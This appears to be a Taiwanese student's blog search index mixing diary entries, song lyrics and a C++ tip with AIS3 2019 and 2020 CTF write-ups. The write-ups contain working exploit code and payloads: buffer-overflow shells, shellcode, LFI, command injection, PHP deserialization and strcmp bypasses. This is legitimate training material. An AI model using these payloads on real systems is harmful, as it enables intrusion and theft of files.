<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>20181102 Diary</title>
    <url>/posts/2018-11-02-Diary/</url>
    <content><![CDATA[久久沒更新了 都快變廢墟惹zz心血來潮 更個~


順便把 git ssh 連線搞定 以後可以無帳密 push 囉!!!!!是說要在 Windows 用 ssh 相關東西現在終於比較方便了Win10 現在新版都有內建 ssh至於 .ssh/ 的資料夾會生成在使用者目錄底下私鑰改名為 id_rsa 丟在目錄底下即可
近況開學好一陣子了大二以後真的比之前忙了不少然後下星期段考QQ資料結構 恩…大概只剩這科不確性最高XD
之後還有準備跟幾個朋友一起把輔大的 Online Judge 架起來因此要學一些後端的東西比如說 Flask 跟 MySQL
還有這季追了 5 部新番大推青春豬頭RRRRR至於有生之年系列的刀劍神域跟魔法禁書目錄就看個人喜好啦~但是刀劍這次是全新篇章 Alicization 有沒有前面的背景知識影響不大這次是會動的愛麗絲喔喔喔喔喔喔!!!!!
時間快不夠用了啦XD
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>好歌推薦 - 君に届け／flumpool</title>
    <url>/posts/2018-11-17-%E5%A5%BD%E6%AD%8C%E6%8E%A8%E8%96%A6%20-%20%E5%90%9B%E3%81%AB%E5%B1%8A%E3%81%91%EF%BC%8Fflumpool/</url>
    <content><![CDATA[介紹電影 ｢君に届け｣ 同名主題曲由flumpool演唱


無意間聽到這首歌真TM好聽ww歌詞真的很適合送給心上人呢XD
歌詞つぶらな瞳もtsuburana hitomi mo鼻にかかる　じゃれた声もhana ni kakaru jareta koe moその小さな手もsono chiisa na te mo上手く笑えない君が　笑えばumaku warae nai kimi ga warae baあの日見た夢がまた一つ　叶うano hi mita yume ga mata hitotsu kanau行き交う他人たちの幸せ　自分のことのようにyukikau hitotachi mo shiawase jibun no koto no youniどうして　ねぇ　願うの？doushite ne gau no君に逢えたこと　本当によかったとkimi ni ae takoto hontou ni yokattatoそう言える　その笑顔を守りたいsou ie ru sono egao wo mamori tai来年も　再来年も　今以上に　君が好きでrainen mo sarainen mo imaijou ni kimi ga suki deそれぐらい　僕のすべてでsorekurai boku no subete de僕にしか言えない言葉を　今　君に届けたいboku ni shika ie nai kotoba wo ima kimi ni todoke tai投げ出したくなってnagedashi takunatte悩んで泣いて　時には喧嘩してnayan de nai te tokini wa kenkashiteそんな毎日でsonna mainichi deそれでも君は君らしく　また歩んでくsoredemo kimi wa kimi rashiku mata ayun deku木漏れ日の下　愛しいkomore bi no shita itoshii飛び交う嘘や嫉妬に　迷い惑わされない心よtobikau uso ya shitto mayoi nadono sae nai kokoro yoまっすぐな　祈りよmassuguna inori yo僕は目を閉じて　君との未来をboku wa me wo tojite kimi tono mirai wo想い描く　その笑顔も描いてるomoi egaku sono egao wo egai teruいつも　いつまでも　想うことは一つだけitsumo itsumademo omou koto wa hitotsu dakeたまらなく君が好きだよtama ranaku kimi ga suki dayo君にしか言わない言葉を　紡ぎだしていくからkimi nishika iwa nai kotoba wo tsumugi tashi teikukaraどんな君の側面を見ても　大袈裟かもしれないけどdonna kimi no sokumen wo mite mo oogesa kamoshirenaikedoそのどれもが僕の胸を打つ　抱きしめたいsonodoremoga boku no mune wo utsu dakishimetaiもしも悲しみに包まれたなら　僕はmoshimo kanashimi ni tsutsuma retanara boku wa今すぐ　君に逢いに行くよima sugu kimi ni ai ni yuku yo届け　今　届け　君に言えずにいた「I love you」todoke ima todoke kimi ni ie zuniita「I love you」その心の真ん中にsono kokoro no mannaka ni来年も　再来年も　今以上に　君が好きでrainen mo sarainen mo imaijou ni kimi ga suki deそれぐらい　僕のすべてでsorekurai boku no subete de僕にしか言えない言葉を　見つけたからboku nishika ie nai kotoba wo mitsu ketakara心まで交わしい想い　君に届けたいkokoro made kawashii omoi kimi ni todoke tai
]]></content>
      <tags>
        <tag>song</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ STL中的push() 小技巧</title>
    <url>/posts/2018-11-07-C-STL%E4%B8%AD%E7%9A%84push-%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[STL 好方便 RC++ 中的 STL(Standard Template Library) 真D非常方便RRRRRRRRRRRRRRRRR相信寫過一段時間 C++ 的朋友應該對於這東西不陌生啥都幫你刻好 只要敲幾個英文 include 就可以用到爽…


以下正文舉些平常會一直使用到的東西當例子比如說 stack, queue 這兩個超基礎 但是卻被大家用到爆的資料結構其中都有包含 push() 這個 function
我們知道宣告可以用這樣的語法 stack&lt;T&gt; 來宣告而其中的的 T 也可以使用像是 struct, class 這類的東西當底
不過這時候就很尷尬了因為 push() 裡面要怎麼塞勒QQ
有兩種方法分別用於有 constructor 與沒有 constructor 兩種情況

無 Constructor :
struct QQ&#123;	int a, b;&#125;;int main()&#123;	stack&lt;QQ&gt; qq;	// 直接用個大括號包起你要的變數	qq.push( &#123;10, 20&#125; );	return 0;&#125;

有 Constructor :
struct QQ&#123;	int a, b;	QQ()&#123;&#125;;	QQ(int num, int num2): a(num), b(num2) &#123;&#125;;&#125;;int main()&#123;	stack&lt;QQ&gt; qq;	// 使用呼叫Constructor的方式	qq.push( QQ(10, 20) );	return 0;&#125;

END今天教學就到這了XD
是說 當時第一次在課堂上看到這東西真的覺得有夠炫炮不過隨著稍微對演算法有點點感覺後發現這方法或許在以後 C++ 的使用上會變成很重要的一個技巧因為 stack 與 queue 不可能每次都如願的只塞 int, char 之類的基本 Type隨著東西變得複雜會對於 “自訂一包東西” 變得相對重要而如何將自訂的東西與 STL 完美融合這就需要經驗了~
好想快點變強阿…
]]></content>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>20181106 Diary</title>
    <url>/posts/2018-11-06-Diary/</url>
    <content><![CDATA[日常 &amp; 自我段考週start!!!


資料結構與演算法的重要性這學期選上系上開的一門選修專門在教解題技巧上到現在也漸漸意識到這兩項能力的重要性一個好的方法會讓你的程式運算時間整個飛起來這點相信有在OJ解題的人會有所體會
但是有些邏輯真的難聽懂跟寫出來是天差地遠的兩件事不過真的通了之後會得到莫大的成就感就是了XD
反省不知道從什麼時候開始我變得很怠惰…沒事不會想學什麼新東西然後開學後又因為一個女生被搞的七上八下 心情低落到只想耍廢現在想想WTF? 我中邪了是不是XD
看著身邊幾個曾經走在我後面的好朋友漸漸的 能力已經跟我平起平坐甚至超越我恩…那感覺不太好
最近發現一個朋友好一陣子不太鳥我了原因也許是我太怠惰他看不慣 (?雖然不太意外但要說不在意是不可能的 畢竟他能力好而我愛才啊XD不過也沒差 他不後悔他的決定就好
睡醒後…差不多該努力一下了落掉的東西要一次補回來說真的頗累呢不過 我對自己的學習曲線有信心XD
The END那麼結尾就送給自己一句 : “俺は可能性の獣”
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假始動！</title>
    <url>/posts/2019-01-12-%E5%AF%92%E5%81%87%E5%A7%8B%E5%8B%95%EF%BC%81/</url>
    <content><![CDATA[寒假開始囉大二的第一個學期很快就過完了現在回頭看看直到最後一次段考前的一個多月 自己都處於超頹廢的狀態好險最後有被打醒好好拼一波課業…


大門也太高了吧在學校的資安社團中學習也不知不覺過了一年了從一個連漏洞叫什麼名字都不懂的小屁孩到了現在可以慢慢抓到一些技巧去試著 try 各種問題
我只能說，不愧是資安一年的成長雖然不到大幅度但稍微有點感覺一隻腳指頭踏進那個大門了XD覺得感動QQ
\再一年&#x2F;\再一年&#x2F;2019 的來臨不知道人生還有什麼新的轉捩點呢讓我們 繼續 看下去

寧願多一個朋友也不要多一個敵人

]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>Happy Chinese New Year！</title>
    <url>/posts/2019-02-05-Happy-Chinese-New-Year%EF%BC%81/</url>
    <content><![CDATA[新年快樂RRRR很快的人生第 19 個中國新年來了再過幾個月就要滿20的我 會迎接什麼樣新的人生呢 (期待


瘋狂追番19 冬的番雖然比起上一季似乎不夠有力 畢竟上季出現了一堆大 IP…不過真的看下去後其實有不少U質作品
最大推就 輝夜姬想讓人告白 家有女友 還有 五等分的花嫁
輝夜姬 OP 跟第三集 ED 根本吃毒好久沒看到這麼有愛的製作組了XD第三集那個 ED 我只能說 你看過為了兩分鐘手繪了1124幀的ED嗎 (跪
家有女友恩… 二次元八點檔全新力作扎扎實實地體現了 ”WTF這劇情” 的感覺OP 由美波唱的 「カワキヲアメク」 本季神曲沒有之一
五等分的花嫁來了來了 本季最大黨派之爭五個姐妹五胞胎 五個老婆不唬爛雖然說有五姊妹但 b 站人氣投票四姊妹加起來沒一個三玖高殘酷地顯示了無法五等分的人氣…
END這季算了下追了 9 部 (加上幾個半年番 還有被朋友抓去一起看的幾部大概是有史以來最多的一次了…
私心大推 天使降臨在身邊 跟 Endro~!呵呵呵呵呵嘻嘻嘻嘻嘻精神口糧 (蘿莉能量x
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 2019 Pre-Exam Writeups</title>
    <url>/posts/2019-06-21-AIS3-2019-Pre-Exam-Writeups/</url>
    <content><![CDATA[終於放暑假了，這學期真D忙爆到現在才有空寫writeup是說今年暑假行程也滿檔… 駕訓班, 研習營, AIS3…樣樣來真…真爽


上次AIS3時才剛學資安不到半年，分數慘不忍睹菜到只剩備取尾巴一年後的今天一口氣爬上了8X名，真的非常感謝學長這一年中的教導，雖然還是菜到廢 (我有個學弟好強R QQ)希望明年能擠進50，希望有天也能變大佬 (X

PwnWelcome BOF注意！！！這是 x64 系統逆向看到輸入的變數會放在 rbp - 30h 的位置然後會發現有個沒用到的 function call 了 system(&quot;sh&quot;) 在 0x40068B由於是 x64 系統每個 stack 格子就變成 8 byte 了
(python -c &quot;from pwn import *; print &#x27;a&#x27;*0x38 + p64(0x400687);&quot;;cat -) | nc pre-exam-pwn.ais3.org 10000

ORW第一次看到這種題目，稍微花了時間去研究 seccomp總之就是一種黑名單白名單的東西而這題限制了只能用 open, read, write 的 syscall
由於沒開 PIE，所以 addr 並不會變動輸入的東西都放在 0x6010A0先把 shellcode 寫進去然後最後直接 bof 到剛剛寫 shellcode 的位置
from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)shellcode = &#x27;&#x27;shellcode += shellcraft.pushstr(&#x27;/home/orw/flag&#x27;)shellcode += shellcraft.open(&#x27;rsp&#x27;, 0, 0)shellcode += shellcraft.read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 100)shellcode += shellcraft.write(1, &#x27;rsp&#x27;, 100)r = remote(&#x27;pre-exam-pwn.ais3.org&#x27;, 10001)r.sendline(asm(shellcode))r.recvuntil(&#x27;I give you bof, you know what to do :)&#x27;)# r.sendline(0x24*&#x27;a&#x27; + &#x27;\x98\x08\x40\x00\x00\x00\x00\x00&#x27;)r.sendline(0x20*&#x27;a&#x27; + &#x27;\xa0\x10\x60\x00\x00\x00\x00\x00&#x27;)r.interactive()


ReverseTrivial有個 function 有一堆數字 (相信我你一看就會知道是哪個 function)全轉 char 就會看到 flag 了
TsaiBro逆向看 code 邏輯應該是每個字都會被處理成一段字串把檔案丟進 linux 生出 A-Za-z&#123;&#125;_ 的字典檔開始推 flag
HolyGrenade把 pyc 丟去 python 的逆向，網上搜一搜很多發現 flag 是每四個字為一組去加密的所以 爆破
from hashlib import md5def OO0o(arg):	arg = bytearray(arg, &#x27;ascii&#x27;)	for Oo0Ooo in range(0, len(arg), 4):		O0O0OO0O0O0 = arg[Oo0Ooo]		iiiii = arg[(Oo0Ooo + 1)]		ooo0OO = arg[(Oo0Ooo + 2)]		II1 = arg[(Oo0Ooo + 3)]		arg[Oo0Ooo + 2] = II1		arg[Oo0Ooo + 1] = O0O0OO0O0O0		arg[Oo0Ooo + 3] = iiiii		arg[Oo0Ooo] = ooo0OO	return arg.decode(&#x27;ascii&#x27;)# flag += &#x27;0&#x27; * (len(flag) % 4)# for Oo0Ooo in range(0, len(flag), 4):#	print(OO0o(md5(bytes(flag[Oo0Ooo:Oo0Ooo + 4])).hexdigest()))goal = [&#x27;ba3a7f3bd92a5d418f5e16886db62674&#x27;,		&#x27;33e4500b205b80e52dd52e796cba8b7d&#x27;,		&#x27;7d1c09bbf2025facf6bd0fec0ec6a780&#x27;,		&#x27;9cedd8dee7b5b87838d7a9bed76df8e5&#x27;,		&#x27;764d30cb4807c5a870a47b53be6cf662&#x27;,		&#x27;f1e8fda6c3ff87e43905ea1690624c64&#x27;,		&#x27;d7939cb11edaa9b1fb05efb4e2946f75&#x27;,		&#x27;5ae001ebd955475c867617bdb72e7728&#x27;]def main(input):	words = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;_&#x27;	for i in range(len(words)):		for j in range(len(words)):			for k in range(len(words)):				for l in range(len(words)):					flag = words[i] + words[j] + words[k] + words[l]					if OO0o(md5(bytes(flag[0:4].encode(&#x27;ascii&#x27;))).hexdigest()) == input:						print(flag)						returnfor i in range(len(goal)):	main(goal[i])


WebSimpleWindow清快取後flag在cookie中
Hidden這題超傻眼，看著一堆人解出來沒想過自己卡在這種莫名其妙的地方…都找到了 flag 在哪算 卻不會執行QQ
關鍵在 js #3133 的 var r = function()&#123;&#125;;丟到 console 之後用 r() 來執行
d1v1n6原本用 base64 會無法顯示完整 index.php，因為字數限制 1000改用 ?path=php://filter/read=string.rot13 可以噴出完整 code但發現根本沒差幾行
發現要用 127.0.0.1 才能看到 flag 位置，因為是用 SERVER[&#39;REMOTE_ADDR&#39;]所以 X-Forwarded-For 那招沒用
php 偽協議好ㄘ，雖然用 localhost 也不是預期解，因為官方說 regex 沒寫好才導致 localhost 可以用的…
payload : ?path=php://filter/read=convert.base64-encode/resource=http://localhost

MiscWelcome簽到題echo -n &#39;Welcom to AIS3 pre-exam in 2019!&#39; | md5sum這段丟去執行出來然後包起來就是 flag 了
KcufsJ根據標題提示是反轉的 JsFuck執行後會出現在 F12 的 console 中
Are you admin?將中間的 &quot;is_admin&quot;:&quot;no&quot; 用另一個 object 包起來然後自己構造 &quot;is_admin&quot;:&quot;yes&quot; 來通過驗證
payload : &#123;&quot;name&quot;:&quot;aaa&quot;,&quot;is_admin&quot;:&quot;yes&quot;,&quot;obj&quot;:&#123;&quot;aaa&quot;:&quot;a&quot;,&quot;is_admin&quot;:&quot;no&quot;, &quot;age&quot;:&quot;12&quot;&#125;,&quot;0&quot;:&quot;0&quot;&#125;
Pysh一樣很傻眼，找到了 read 可以用但沒乖乖把文件看完想說先放著放著放著 就忘了…
這題就是在過濾的字中找可以用的指令很多種 像上面說到的 read $s;$s或是 linux 系統中的預設環境變數 $BASH, $SHELL (這兩個很屌 看官方解才學到的QQ)
Crystal Maze對不起，我手走迷宮還用 Excel 畫地圖…

CryptoTCash單純爆破
from hashlib import md5,sha256md5s =    [41, 63, 46, 51,  6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33,  1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27,  1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31,  3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38,  8, 50, 29, 15]sha256s = [61, 44,  3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11,  3, 24, 35, 40, 46,  3, 42, 59, 36, 41, 41, 41, 40,  9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39,  9, 42,  3, 40, 24, 35, 24, 40,  3, 61, 49, 24, 40,  9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11,  9, 40, 24, 18, 40,  3, 41, 11, 12, 42, 40, 44,  9, 59, 40, 61, 42,  3, 40, 44, 13, 61, 40,  3, 24, 29, 40, 59, 24, 40, 19, 18,  6, 59, 24, 18,  6, 22,  0, 39, 40, 61, 57,  3, 40, 17, 35, 42, 40, 58, 24, 58,  9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58,  9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]cand = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _&#123;&#125;&#x27;index = 0while True :	for i in cand :		tmp = int(md5(i.encode()).hexdigest(),16)%64		tmp2 = int(sha256(i.encode()).hexdigest(),16)%64		if tmp == md5s[index] and tmp2 == sha256s[index] :			print(i)			break	index = index + 1	if index == len(md5s):		break
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>好歌推薦 - 気ままな天使たち／わたてん☆５</title>
    <url>/posts/2019-02-25-%E5%A5%BD%E6%AD%8C%E6%8E%A8%E8%96%A6%20-%20%E6%B0%97%E3%81%BE%E3%81%BE%E3%81%AA%E5%A4%A9%E4%BD%BF%E3%81%9F%E3%81%A1%EF%BC%8F%E3%82%8F%E3%81%9F%E3%81%A6%E3%82%93%E2%98%86%EF%BC%95/</url>
    <content><![CDATA[介紹19冬 天使降臨到我身邊！ OP
U質療癒番，不多做解釋了


歌詞La la la la la la la　La la la la la la la la laさあ今夜も元気に　始めましょう！saa konyamo genkini hajimemoshou天使が舞い降りる時間tenshiga mai oriru jikan自由気ままに　はしゃいでいたいのjiyuu kimamani hashaideitaino一緒に遊びましょ！isshoni asobimasho毎日色々とあるけど今日は全部　ぽいぽいぽいぽい！mainichi iroiroto arukedo kyouwa zenbu poi poi poi poiみんなで踊ろう　両手を広げ　今minnade odorou ryoute  o hiroge imaあなたのすぐそばにいるよanata no sugusobani iruyo気ままな天使たちkimamana tenshitachi雨ふりさびしい時にはamefuri sabishii tokini wa笑顔で手を叩こう！egaode te o tatakouあなたのすぐそばにいるよanatano sugusobani iruyoつらい時、悲しい時tsuraitoki kanashiitokiお星様キラキラ笑顔でohoshisama kirakira egaode明日は晴れ模様ashitawa haremoyouドキドキを　プレゼントdokidokio purezentoここだけの　秘密だよkokodakeno himitsudayoLa la la la la la　La la la la la laさあとってもスウィートで　ちょっぴりビターなsaa tottemo suwittode choppiribita na天使が舞い降りる時間tenshiga mai oriru jikanしっかり屋さんも　うっかり屋さんもshikkariyasanmo ukkanriyasanmo一緒に手をつなごう！isshoni te o tsunagouうまくいかない日もあるけど今日は全部umakuikanaihimo arukedo kyouwa zenbuぽいぽいぽいぽい！poi poi poi poiみんなで歌おう　声を合わせて　今minnadeutaou koe o awaswte imaあなたのすぐそばにいるよanatano sugusobani iruyo気まぐれ天使たちkimagure tenshitachi時々かくれんぼしてもtokitokika kurenboshitemo必ず見つけてねkanarazu mitsuketeneあなたのすぐそばにいるよanatano sugusobani iruyo泣きたい時、寂しい時nakitaitoki sabishiitokiお月様まんまる笑顔でotsukisama mannmaru egaode明日も晴れ模様ashitamo haremoyouワクワクを　プレゼントwokuwokuo purezentoここだけの　秘密だよkokodakeno himitsudayo想いの全部を込めてomoino zenbu o kometeまっすぐに矢を放つよmassuguni ya o hanatsuyoあなたのすぐそばにいるよanatano sugusobani iruyo気ままな天使たちkimamana tenshitachi雨ふりさびしい時にはamefuri sabishii tokiniwa笑顔で手を叩こう！egaode teo tatakouあなたのすぐそばにいるよanatano sugusobani iruyoつらい時、悲しい時tsuraitoki kanashiitokiお星様キラキラ笑顔でohoshisama kirakira egaode明日は晴れ模様ashitawa haremoyouドキドキを　プレゼントdokidoki o purezentoここだけの　秘密だよkokodakeno himitsudayo
]]></content>
      <tags>
        <tag>song</tag>
      </tags>
  </entry>
  <entry>
    <title>First Post</title>
    <url>/posts/2018-08-31-First-Post/</url>
    <content><![CDATA[恩…搞了一整天終於架起來了架站後得第一篇文章一定很有紀念價值QQ


以後普通文章大概都會以日記型式post吧心路歷程 Action!
從小就一直對程式有種特別的感覺但是求學階段卻一直到大學才開始真正接觸到programming雖然覺得惋惜沒有早點自學不過也很慶幸能選到自己心目中理想的科系就是了XD
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3-2019 新竹一週遊 (?</title>
    <url>/posts/2019-08-04-AIS3-2019-%E6%96%B0%E7%AB%B9%E4%B8%80%E9%80%B1%E9%81%8A/</url>
    <content><![CDATA[第二次的AIS3很高興今年也能來參加但與往年不同的是 今年主辦單位一改以往的活動流程本來都是以上滿技術課且以 FinalCTF 作結尾這次上了五天的課最後以專題報告結尾


就我的感覺下來這次的課程充滿了 ”倫理”比起往年的技術成分 這次反而多了不少心態上的反思至於教的東西 一堂課時間都太趕了XD在當下真的跟不太上
整體下來我不喜歡做專題的方式XD還是喜歡打 CTF www 但倒是認識了不少朋友 (全台最”黑”交友平台上線啦
還有就是環境有點坎坷… 交大裡面跟附近真的都沒什麼東西…
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 2020 pre-exam Writeups</title>
    <url>/posts/2020-06-18-AIS3-2020-pre-exam-Writeups/</url>
    <content><![CDATA[
不知道是不是今年太多大大沒有打我才能名次比較前面 QQ
不過也不枉費今年認真的練習在解題的時候明顯有感受到自己的想法跟邏輯非常流暢但我的 crypto 還是一樣爛



Misc💤Piquero
braille online

AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;


🐥Karuego題目圖片有藏一個 zip 但有加密發現裡面有張圖片 files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg網路上也有一模一樣的 3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpgpkcrack 直接炸開這包 zip但要注意用 pkcrack 前 需要先將圖片跟 zip 分離

AIS3&#123;Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?&#125;

🌱Soy用這個工具手工把 QR code 大致還原後（右下角一定不能損毀）點右上角的 Tools -&gt; Extract QR Information flag 就會出來了詳細自己啃 QR code 原理

AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;

👿Shichirou構造一個 link 指向 ../flag.txt包成 tar 後送給 server
from pwn import *host = &#x27;60.250.197.227&#x27;port = 11000r = remote(host, port)f = open(&#x27;a.tar&#x27;, &#x27;r&#x27;).read()l = len(f)r.sendline(str(l))r.sendline(f)print(r.recvline())


AIS3&#123;Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!&#125;

👑Saburoflag 字母對了回傳的時間會變多但秒數很漂每個字母取 10 次的平均找最大的就是 flag
from pwn import *import stringhost = &#x27;60.250.197.227&#x27;port = 11001d = string.printableflag = &#x27;AIS3&#123;&#x27;while True:	tmp_c = &#x27;&#x27;	sec_max = 0	for c in d:		c_sec_avg = 0		for j in range(10):			r = remote(host, port)			r.sendline(bytes((flag + c).encode(&#x27;ascii&#x27;)))			try:				sec = int(r.recvline().decode(&#x27;ascii&#x27;).split()[5])			except:				print(&#x27;[OK]&#x27;, flag+c)				exit()			r.close()			c_sec_avg += sec		c_sec_avg /= 10		if c_sec_avg &gt; sec_max:			tmp_c = c			sec_max = c_sec_avg	flag += tmp_c	print(sec_max, flag)


AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;


Crypto🦕 Brontosaurus檔案打開發現是 jsfuck 但執行卻炸裂題目敘述 jsfuck 反過來了因此猜測整段文件要 reverse 再執行
PS. 這題貌似以前出過？

AIS3&#123;Br0n7Os4uru5_ch3at_3asi1Y&#125;

🦖 T-Rex查表 感恩
f = open(&#x27;prob&#x27;).readlines()f = [ i.split() for i in f ]d = dict()for i in f[0]:	d[i] = dict()for i in range(1, len(f)-1):	for j in range(1, len(f[i])):		d[ f[0][j-1] ][ f[i][0] ] = f[i][j]for i in f[len(f)-1]:	if len(i) == 1:		print(i, end=&#x27;&#x27;)	else:		print(d[i[0]][i[1]], end=&#x27;&#x27;)


AIS3&#123;TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX&#125;

🐙 OctopusQKD BB84題目給了溝通兩端的 bias 以及 光子偏振態我們就假設未被竊聽因此偏振態一樣來解密按照 wiki 的敘述相同 bias 且偏振態方向合理才會被採納
# 0 up# 1 right# 2 right up# 3 right downf = open(&#x27;output&#x27;).readlines()a_b = [ i for i in eval(f[0].strip()[11:]) ]b_b = [ i for i in eval(f[3].strip()[11:]) ]qu = [ i for i in eval(f[1].strip()[11:]) ]flag = f[5].strip()qu_direc = list()bit = &#x27;&#x27;for i in qu:	if i.real == 0:		qu_direc.append(1)	elif i.real &gt; 0 and i.imag &gt; 0:		qu_direc.append(2)	elif i.real &gt; 0 and i.imag &lt; 0:		qu_direc.append(3)	else:		qu_direc.append(0)for i in range(1024):	if a_b[i] == b_b[i]:		if a_b[i] == &#x27;+&#x27;:			if qu_direc[i] == 0:				bit += str(0)			elif qu_direc[i] == 1:				bit += str(1)		elif a_b[i] == &#x27;x&#x27;:			if qu_direc[i] == 2:				bit += str(0)			elif qu_direc[i] == 3:				bit += str(1)flag = hex(int(bit[:400],2) ^ int(flag))flag = bytes.fromhex(flag[2:]).decode(&#x27;utf-8&#x27;)print(flag)


AIS3&#123;EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84&#125;


Reverse🍍TsaiBro去年也有一樣的題目 XD超級 basic 的逆向
從 code 中可以發現table 存著字典照著 index 的順序可以看出轉換的規律每個字由兩組 發財 跟 . 構成第一組 . 的規則是 index // 8 + 1第二組 . 的規則是 index % 8 + 1
import ref = open(&#x27;TsaiBroSaid&#x27;, encoding=&#x27;utf-8&#x27;)s = r&#x27;56789&#123;&#125;_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234&#x27;d = dict()for i in range(len(s)):	tmp = &#x27;發財&#x27; + &#x27;.&#x27; * (i // 8 + 1) + &#x27;發財&#x27; + &#x27;.&#x27; * (i % 8 + 1)	d[tmp] = s[i]data = re.findall(r&#x27;發財\.*發財\.*&#x27;, f.readlines()[1])for i in data:	print(d[i], end=&#x27;&#x27;)


AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;

🎹Fallen Beat先說工具會用到 Jadx JBE(Java Bytecode Editor)
jar 丟進 jadx 看PanelEnding.class 中有 flag 的運算而這個 setValue() 會在 GameControl.run 中被 call把 total 跟 maxCombo 都 patch 成 0 讓等式恆成立

AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;


Web🐿️Squirrel不小心在 F12 發現 api.php 有 LFI 以 json 的方式讀取 api.php 得到 src
&lt;?phpheader(&#x27;Content-Type: application/json&#x27;);if ($file = @$_GET[&#x27;get&#x27;]) &#123;    $output = shell_exec(&quot;cat &#x27;$file&#x27;&quot;);    if ($output !== null) &#123;        echo json_encode([            &#x27;output&#x27; =&gt; $output        ]);    &#125; else &#123;        echo json_encode([            &#x27;error&#x27; =&gt; &#x27;cannot get file&#x27;        ]);    &#125;&#125; else &#123;    echo json_encode([        &#x27;error&#x27; =&gt; &#x27;empty file path&#x27;    ]);&#125;

我們可以發現 #6 有 command injection注意有單引號
payload : https://squirrel.ais3.org/api.php?get=&#39;;cat /5qu1rr3l_15_4_k1nd_0f_b16_r47.txt;&#39;
PS. 這題也跟去年有題好像 XD

AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;

🐘Elephant提示說有 src 可以看到處翻都沒有結果發現有 .git/ok~ dump
接著還原出 index.php 看 src取重要的部分看


吐 flag 的地方是用 strcmp() 比較的怎麼可能 md5 之後會等於 flag 根本天方夜譚那就直接戳爆 strcmp() 吧給他一個 array 他就會回傳 0 繞過比較了
然後東西是先序列化再 base64所以我們就構造一個 token 等於 array 的物件回去當cookie
&lt;?phpclass User &#123;    public $name;    private $token;    function __construct($name, $token) &#123;        $this-&gt;name = $name;        $this-&gt;token = $token;    &#125;&#125;$t = array();$o = new User(&#x27;a&#x27;, $t);echo base64_encode(serialize($o));


AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;

🦈Shark去年的 d1v1n6 d33p3r
payload : https://shark.ais3.org/?path=http://172.22.0.2/flag

AIS3&#123;5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5&#125;

🐍Snake主要是考 python 反序列化測試發現是 python3
順便構造 inheritance chain 來 get shell當然也是可以直接讀 flag 就好啦但 get shell 比較帥
